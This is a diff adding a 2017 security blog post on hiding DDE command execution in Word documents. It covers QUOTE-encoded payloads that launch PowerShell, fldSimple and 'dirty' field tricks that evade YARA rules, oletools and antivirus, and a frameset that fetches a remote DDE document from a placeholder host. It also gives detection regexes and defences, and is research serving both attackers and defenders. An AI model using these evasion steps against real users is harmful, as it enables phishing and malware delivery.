@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]><html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--><html class="no-js" prefix="og: http://ogp.me/ns#" xmlns:og="http://ogp.me/ns#"><!--<![endif]-->
+
+    <head>
+                <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" />
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black">
+        <meta name="author" content="">
+  
+	
+        <meta property="og:site_name" content="Staaldraad">
+        <meta property="og:title" content="Staaldraad">
+        <meta property="og:url" content="https://staaaldraad.github.io/2017/10/23/msword-field-codes/">
+        <meta property="og:description" content="">
+    
+        <meta property="og:type" content="article" />
+        <meta property="og:article:author" content="" />
+        <meta property="og:article:published_time" content="2017-10-23T15:14:39Z" />
+    
+        <meta name="generator" content="Hugo 0.31-DEV" />
+        <title>MSWord - Obfuscation with Field Codes &middot; Staaldraad</title>
+        <link rel="canonical" href="https://staaaldraad.github.io" />
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="">
+        <link rel="stylesheet" type="text/css" href="https://staaaldraad.github.iocss/main.css"/>
+        <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300|Montserrat:700" rel="stylesheet" type="text/css">
+        <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+        <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+    </head>
+
+<body>
+<!--[if lt IE 7]><p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chrome/‎">install Google Chrome</a> to experience this site.</p><![endif]-->
+
+    <header id="site-header">
+        <div class="container">
+            <a href="https://staaaldraad.github.io" alt="Staaldraad"><h1 class="blog-title heading">Staaldraad</h1></a>
+            <p class="blog-description"></p>
+        </div>
+    </header>
+<main class="content" role="main">
+	<div class="container">
+		<article class="post">
+	<header class="post-header">
+        <h3 class="p-post-title">MSWord - Obfuscation with Field Codes</h3>
+    </header>
+
+    <section class="post-content">
+        
+
+<p>A few weeks back Saif El-Sherei and I posted on the <a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/">SensePost</a> blog about DDE and getting command exec in MSWord without macros. This post got way more attention than we initially expected it would. Since then DDE has been used in phishing and malware campaigns, as well as legitimate red-team engagements. With the rapid rise in attacks using DDE, detection has been stepped up and most AV engines have basic DDE detection built in. Most of this detection has been based around YARA rules, which identify the <strong>DDE</strong> or <strong>DDEAUTO</strong> strings in .docx and .doc files. This got me wondering if it would be possible to obfuscate the DDE out of the document. One or two attempts at this have emerged, with threat-actors changing the case of the DDE string, and splitting it across multiple lines as described here; <a href="https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/">Macroless DOC malware that avoids detection with Yara rule</a>.</p>
+
+<p>In this post I&rsquo;ll share my attempts at obfuscation and detection bypass. Hopefully this will be helpful for both attack and defence.</p>
+
+<ol>
+<li>Obfuscating the payload</li>
+<li>Hiding DDE/DDEAUTO</li>
+<li>Defensive notes</li>
+</ol>
+
+<h1 id="payload-obfuscation">Payload Obfuscation</h1>
+
+<p>Before digging into ways of obfuscating the <strong>DDE</strong> and <strong>DDEAUTO</strong> field codes, I decided to focus on obfuscating the payload. The reason for this being two-fold. Firstly, the payload is simply a string, rather than a reserved field code, meaning obfuscation is less likely to break the functionality. Secondly, we have more room for obfuscation, trying to hide three characters (DDE) is much more of a challenge than obfuscating a 255 character string.</p>
+
+<p>Seeing as we are dealing with field codes already, it felt like a good place to try and find some more obfuscation. A quick search for &ldquo;<em>list field codes word</em>&rdquo; lead to <a href="https://support.office.com/en-us/article/List-of-field-codes-in-Word-1ad6d91a-55a7-4a8d-b535-cf7888659a51">this support article by Microsoft</a>, which, helpfully, contains a list of all supported field codes. After spending some time going through the various fields, one struck me as possibly helpful. This being the <strong>QUOTE</strong> field, which has the described functionality of &ldquo;The Quote field inserts the specified text into a document.&rdquo;. This sounded promising as we were looking at ways to manipulate the payload string and the QUOTE field allows for manipulation of a string and inserting it into a document.</p>
+
+<p><em>As a side note</em>, it is important to remember that field codes can be nested in word, the following is provided as an example is provided for usage of the QUOTE field:</p>
+
+<pre><code>{ QUOTE { IF { DATE \@ &quot;M&quot; } = 1 &quot;12&quot; &quot;{= { DATE \@ &quot;M&quot; } -1 }/1/03&quot; \@ &quot;MMMM&quot;} }
+</code></pre>
+
+<p>Here we have nested field codes, the QUOTE field contains the result of the internal IF field code, which inturn contains either the DATE or the formated date, based on a FORMULA (=).</p>
+
+<p>The QUOTE field can be supplied with a characters ordinal value and it will automatically convert this to the corresponding character (I can&rsquo;t find the reference for this unfortunately). As an example, if we wanted to find the character represented by the value 65, we could use the following field in Word:</p>
+
+<pre><code>{ QUOTE 65 }
+</code></pre>
+
+<p>Which would end up displaying <strong>A</strong> rather than <strong>65</strong>, which is exactly what we are looking for. We can now represent our payload as integers and have word automatically convert this to a string before executing our DDE. The full set of field codes to make this work would be:</p>
+
+<pre><code>{SET c &quot;{QUOTE 65 65 65 65}&quot;}
+{SET d &quot;{QUOTE 71 71 71 71}&quot;}
+{DDE {REF c} {REF d}}
+</code></pre>
+
+<p>This effectively becomes:</p>
+
+<pre><code>{DDE &quot;AAAA&quot; &quot;GGGG&quot;}
+</code></pre>
+
+<p>At this point you can use your imagination and figure out that we would replace <strong>AAAA</strong> and <strong>GGGG</strong> with our relevant payloads. To make this easier, I wrote a quick python script that simply converts a given string into the equivalent QUOTE field.</p>
+
+<p>{% gist staaldraad/df29bd1a840cb53ed2819c1980143166 %}</p>
+
+<p>To pop powershell, we can now use the following:</p>
+
+<pre><code>{SET C &quot;{QUOTE 67 58 92 92 80 114 111 103 114 97 109 115 92 92 77 105 99 114 111 115 111 102 116 92 92 79 102 102 105 99 101 92 92 77 83 87 111 114 100 46 101 120 101 92 92 46 46 92 92 46 46 92 92 46 46 92 92 46 46 92 92 119 105 110 100 111 119 115 92 92 115 121 115 116 101 109 51 50 92 92 119 105 110 100 111 119 115 112 111 119 101 114 115 104 101 108 108 92 92 118 49 46 48 92 92 112 111 119 101 114 115 104 101 108 108 46 101 120 101} &quot;}
+{DDE {REF C}  &quot;a&quot;}
+</code></pre>
+
+<h2 id="dirty-links">Dirty links</h2>
+
+<p>One thing to note, is that the DDEAUTO is auto updated when the document opens, as the name implies. However, not all field codes are automatically updated unless we have &ldquo;update links&rdquo; set on the document. To do this (there might be an easier way than mine), we need to either mark our links as &ldquo;dirty&rdquo; or change the document to auto update links.</p>
+
+<p>Once you&rsquo;ve created your .docx, you can open the archive with an archive manager and then you need to edit <em>document.xml</em>. To mark links as being <em>dirty</em> and requiring update add the <code>w:dirty=&quot;true&quot;</code> to each <em>begin</em> <code>&lt;w:fldChar&gt;</code>:</p>
+
+<pre><code>  &lt;w:fldChar w:fldCharType=&quot;begin&quot; w:dirty=&quot;true&quot;/&gt;
+</code></pre>
+
+<p>Save document.xml and update the archive. Now when you open the .docx, all links will be auto updated. You also receive the much cleaner &ldquo;Do you want to update&rdquo; dialog.</p>
+
+<p><img src="/assets/update_dialog_dde.png" alt="Update dialog" /></p>
+
+<h2 id="results">Results</h2>
+
+<p>The big question is, have we achieved anything by using <strong>QUOTE</strong>? Turns out, yep. The sample that simply spawns powershell (I&rsquo;m assuming that Word spawning Powershell is an indicator of maliciousness) has a <sup>1</sup>&frasl;<sub>59</sub> detection ratio on <a href="https://www.virustotal.com/#/file/cce449cbfa35a3fb22399fa8842b98801b9216df6075e2db8b0e6c519d831e83/detection">VirusTotal</a></p>
+
+<p><img src="/assets/dde_quote_vt.png" alt="DDE QUOTE VT" /></p>
+
+<p>Normally you would be able to simply resave the .docx as a .doc and get the same code execution. Unfortunately with this method you will receive a <em>Error! No application specified</em> error when trying to open the .doc, due to the nested field codes not being updated correctly. There might be a way to force updating of all field codes, but my Word knowledge is limited and I couldn&rsquo;t find one.</p>
+
+<h1 id="hiding-dde">Hiding DDE</h1>
+
+<p>The next challenge was to try and hide from some of the existing detections, this included both YARA rules and extraction of DDE links.</p>
+
+<h2 id="yara-rules">YARA Rules</h2>
+
+<p>Most YARA rules I&rsquo;ve seen try and detect one or both of DDE and DDEAUTO in the <em>instrText</em> elements of a .docx (I focused on .docx as it&rsquo;s easier to modify by hand). One of the very first YARA rules to be released was by <a href="https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/">Nviso Labs</a> and contained the following Regex:</p>
+
+<pre><code>/&lt;w:fldChar\s+?w:fldCharType=&quot;begin&quot;\/&gt;.+?\b[Dd][Dd][Ee]\b.+?&lt;w:fldChar\s+?w:fldCharType=&quot;end&quot;\/&gt;/
+</code></pre>
+
+<p>Which worked well on the first batches of malicious docs, but was subsequently bypassed by the multi-line variants. I found another issue with this regex (before reports of the multi-line variants emerged), and reported this to Didier Stevens. When looking into the Office Open XML File format specifications, you&rsquo;ll find that the <strong>fldChar</strong> field is of the &ldquo;Complex Field&rdquo; type and can have an optional attribute. Adding this optional attribute both breaks the YARA rule above, and allows us to use DDE rather than DDEAUTO. This attribute is named <strong>dirty</strong> and have the boolean value <em>true</em> to force an update as described in the specification &ldquo;Specifies that this field has been flagged by an application to indicate that its current results are no longer correct&rdquo;.</p>
+
+<p>This is the same attribute I used above in the QUOTE field to force updating of values. To add it to the document, simply do as before and modify the .docx manually.</p>
+
+<pre><code>&lt;w:r&gt;
+   &lt;w:fldChar w:fldCharType=&quot;begin&quot; w:dirty=&quot;true&quot;/&gt;
+&lt;/w:r&gt;
+</code></pre>
+
+<p>The regex immediately fails as it doesn&rsquo;t account for this optional attribute. I submitted the following update to Didier, which should account for both the optional attribute and the fact that the XML can contain arbitrary spaces:</p>
+
+<pre><code>&lt;w:fldChar\s+?w:fldCharType=&quot;begin&quot;\s+?(w:dirty=&quot;(true|false)&quot;)?\s+?\/&gt;.+?\b[Dd][Dd][Ee]\b.+?&lt;w:fldChar\s+?w:fldCharType=&quot;end&quot;\/&gt;
+</code></pre>
+
+<h2 id="oletools-msodde-py">Oletools - msodde.py</h2>
+
+<p>A really interesting project that I had never tried before this is <a href="https://github.com/decalage2/oletools">python-oletools</a> by <a href="https://twitter.com/decalage2">decalage2</a>. This works really well in extracting the DDE payloads from all known variants of the DDE &ldquo;attack&rdquo;. If we use this against our <strong>QUOTE</strong> version, the link gets extracted cleanly and we can still tell that DDE is present:</p>
+
+<p><img src="/assets/oletools_dde_quote.png" alt="Extract DDE Link" /></p>
+
+<p>It would take a bit more work, but you could easily decode those QUOTE values to the string being executed. How should we bypass this?</p>
+
+<p>Going back to the Office Open XML File format (I love specifications), we identify that there is another element that we can use to reference field codes. The one used up till now has been the &ldquo;Complex Field&rdquo; of <strong>fldChar</strong>, there is however a &ldquo;Simple Field&rdquo; version called, <strong>fldSimple</strong>. The <strong>fldSimple</strong> element doesn&rsquo;t have the same <code>&lt;w:instrText&gt;</code> child element as the <strong>fldChar</strong> does, it actually includes the field code as an attribute; <code>w:instr=&quot;FIELD CODE&quot;</code>.</p>
+
+<p>The example from the specification is:</p>
+
+<pre><code>&lt;w:fldSimple w:instr=&quot;AUTHOR&quot; w:fldLock=&quot;true&quot;&gt;
+    &lt;w:r&gt;
+        &lt;w:t&gt;Rex Jaeschke&lt;/w:t&gt;
+    &lt;/w:r&gt;
+&lt;/w:fldSimple&gt;
+</code></pre>
+
+<p>This can easily be changed to work with DDE and we simple embed our payload as follows:</p>
+
+<pre><code>&lt;w:fldSimple w:instr='DDE &quot;C:\\WINDOWS\\system32\\cmd.exe&quot; &quot;/k powershell.exe&quot;' w:dirty=&quot;true&quot;&gt;
+    &lt;w:r&gt;
+        &lt;w:t&gt;Pew&lt;/w:t&gt;
+    &lt;/w:r&gt;
+&lt;/w:fldSimple&gt;
+````
+
+This gives us our auto executing DDE, and we bypass Oletools;
+
+![Oletools bypass](/assets/oletools_dde_bypass.png)
+
+I've made a [Pull Request](https://github.com/decalage2/oletools/pull/205) for an update to oletools to detect DDE links embedded in **fldSimple** elements.
+
+This also stacks up pretty well against [AV](https://www.virustotal.com/#/file/0f8bc14e32928ec882948977b25483a993fb8b4d9c8bc542aa13ecfbde785837/detection) 
+
+![AV bypassed](/assets/dde_av_bypass.png)
+
+Remember that behaviour based AV should be detecting this once the payload executes, so these results should be taken as &quot;bypass or static scanning&quot;.
+
+### Side Effects
+
+There are also some side effects that creep in when using fldSimple. If you decide to go with **DDEAUTO** AND include ```w:dirty=&quot;true&quot;```, the end user will be prompted 3 times (not sure why three and not two) if they want to execute the DDE application. This does mean you have three chances of them hitting &quot;yes&quot; rather than the usual one. 
+
+Interestingly when launching powershell using the fldSimple and ```c:\\windows\\system32\\cmd.exe /k powershell```, the powershell will be launched inside the cmd window, dropping you straight into the powershell console. This is the same behaviour you would get if you ran powershell from within an existing cmd instance. Unlike the usual DDE that spawns cmd AND powershell. And you'll receive a message of &quot;Cannot load PSReadline module. Console is running without PSReadline&quot; (screenshot). Maybe someone would be interested in digging into this?
+
+![PSReadline](/assets/dde_powershell_fldsimple.png)
+
+## No DDE
+
+Now the ultimate win would be to have no **DDE** or **DDEAUTO** in the document at all, is this possible? It sure is, and has the added benefit of sweetening the Social Engineering aspect. MSWord is nice enough to ask the user to disable protected view in order to see the document contents.
+
+For this, we can abuse another legacy feature (aren't these great). At one point in time Word was billed as a one-stop shop for anything text related, this included creating web pages. Word was an IDE for HTML at one point, the HTML was never pretty but it worked. One of the things introduced around this time was the idea of **frames** and **framesets**. Frames allowed you to load different HTML/Text pages into frames within Word, the HTML was automatically parsed and turned into Word formated content. This functionality seems to have been removed from the UI in Word 2016 (possibly earlier as well), but the underlying parsing routines still remain. This means if you create a document with embedded frames, Word will still process them for you.
+
+To insert a frameset you need to go back to editing a clean .docx. First unzip and then open **webSettings.xml**. You then want to modify add the new XML element **frameset**:
+</code></pre>
+
+<p><w:frameset>
+    <w:framesetSplitbar>
+        <w:w w:val="60"/>
+        <w:color w:val="auto"/>
+        <w:noBorder/>
+    <a href="/w:framesetSplitbar">/w:framesetSplitbar</a>
+    <w:frameset>
+        <w:frame>
+            <w:name w:val="1"/>
+            <w:sourceFileName r:id="rId1"/>
+            <w:linkedToFile/>
+        <a href="/w:frame">/w:frame</a>
+    <a href="/w:frameset">/w:frameset</a>
+<a href="/w:frameset">/w:frameset</a></p>
+
+<pre><code>This should go inside the existing ```&lt;w:webSettings&gt;``` element, right before the ```&lt;w:optimizeForBrowser/&gt;&lt;w:allowPNG/&gt;``` elements. Next you'll need to add **rId1** the relationship that links our document to the external document. 
+This is done by adding a new file to `word/_rels/` called, `webSettings.xml.rels`.
+
+The contents of this file should be:
+</code></pre>
+
+<p>&lt;?xml version=&ldquo;1.0&rdquo; encoding=&ldquo;UTF-8&rdquo; standalone=&ldquo;yes&rdquo;?&gt;
+<Relationships 
+    xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="http://x.x.x.x/simple.docx" TargetMode="External"/>
+</Relationships>
+```
+Where your target is the .docx file containing the DDE. In this case we are going to load the simple.docx file from the http server at <em>x.x.x.x</em>. Save the all the modified/created files, and update the .docx archive. Now you can send the modified file document to your target and they will open it. Because it has the <em>mark of the web</em> this will be opened in protected view. However, because Word detects that external content is required for the file to display correctly, the contents will be displayed as: &ldquo;Linked files and other functionality has been disabled. To restore this functionality, you must Edit this file.&rdquo; - note that this is the default message from Word, we have no control over this.</p>
+
+<p><img src="/assets/externalframe_pv.png" alt="Protected View" /></p>
+
+<p>As soon as Protected View is disabled, Word will download the external document containing our DDE. This does not receive the &ldquo;mark of the web&rdquo; and is parsed by Word, triggering the normal DDE messages. This is a pretty useful way of smuggling our DDE payload in without getting scanned by AV.</p>
+
+<h1 id="defence">Defence</h1>
+
+<p>The best defence seems to be the disabling of auto updating links, don&rsquo;t rely on AV here. The goto resource for changing your Office install to ignore links and prevent auto updating of these was created by <a href="https://twitter.com/wdormann">Will Dormannn - @wdormann</a> and is available here: <a href="https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b">https://gist.github.com/wdormann/732bb88d9b5dd5a66c9f1e1498f31a1b</a>.</p>
+
+<p>Another defensive mechanism that I&rsquo;m super excited to try out is the introduction of Windows Defender Exploit Guard in the Windows 10 Fall Creators update: <a href="https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard">https://docs.microsoft.com/en-us/windows/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard</a>. The beauty of this being that you can prevent Word/Excel/Powerpoint from spawning child processes. This should stop not only this attack but also DDE and embedded OLE etc. Bare in mind, that <a href="https://twitter.com/enigma0x3/">Matt Nelson - @enima0x3</a> has shown that neither <a href="https://twitter.com/enigma0x3/status/922167827817287680">Outlook nor Access are enrolled in ASR</a>.</p>
+
+<p>As mentioned there is a pull request in the works for updating oletools, and most YARA rules that trigger on the word DDE or DDEAUTO should still work. If you are searching for strings such as <strong>powershell</strong> then you might need to update your logic ;)</p>
+
+    </section>
+
+    <hr>
+
+    <footer class="post-footer">
+        <section class="f-1">
+            
+            
+            <p class="f-post-time"><time datetime="2017-10-23T15:14:39Z">October 23, 2017</time></p>
+        </section>
+                        
+        <section class="f-2">
+            <section class="share">
+                <span>Share:
+                <a class="icon-twitter" href="http://twitter.com/share?text=MSWord%20-%20Obfuscation%20with%20Field%20Codes&url=https%3a%2f%2fstaaaldraad.github.io%2f2017%2f10%2f23%2fmsword-field-codes%2f"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <i class="fa fa-twitter"></i>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fstaaaldraad.github.io%2f2017%2f10%2f23%2fmsword-field-codes%2f"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <i class="fa fa-facebook"></i>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https%3a%2f%2fstaaaldraad.github.io%2f2017%2f10%2f23%2fmsword-field-codes%2f"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <i class="fa fa-google-plus"></i>
+                </a>
+                </span>
+            </section>
+
+            
+        </section>
+                        
+    </footer>
+</article>
+	</div>
+</main>
+    <footer id="site-footer">
+        <div class="container">
+          
+          
+          
+          
+          <a href="https://staaaldraad.github.ioindex.xml" title="Get the RSS feed"><span class="tooltip"><i class="fa fa-rss"></i></span></a>
+          <section>&copy; <a href="https://staaaldraad.github.io"></a> 2017 | All rights reserved</section>
+          <section>Theme by <a href="http://www.jrdnbwmn.com">Jordan Bowman</a>. Generated with <a href="http://gohugo.io/">Hugo</a>.</section>
+        </div>
+    </footer>
+
+    <script type="text/javascript" src="https://staaaldraad.github.iojs/fittext.js"></script>
+    <script type="text/javascript">
+      $(".heading").fitText();
+    </script>
+
+
+
+</body>
+</html>
